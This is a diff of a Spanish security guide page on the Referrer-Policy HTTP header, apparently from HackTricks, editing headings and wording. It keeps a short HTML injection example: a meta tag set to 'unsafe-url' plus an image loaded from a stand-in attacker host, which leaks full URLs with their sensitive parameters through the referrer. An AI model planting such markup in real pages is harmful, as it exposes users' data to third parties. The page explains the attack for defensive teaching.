@@ -21,15 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
-## Contra-Mitigación
+## Contramedidas
 
 Puedes anular esta regla utilizando una etiqueta meta HTML (el atacante necesita explotar una inyección HTML):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
 ## Defensa
 
-Nunca pongas datos sensibles dentro de parámetros GET o rutas en la URL.
+Nunca pongas datos sensibles dentro de los parámetros GET o rutas en la URL.
 
 {{#include ../banners/hacktricks-training.md}}
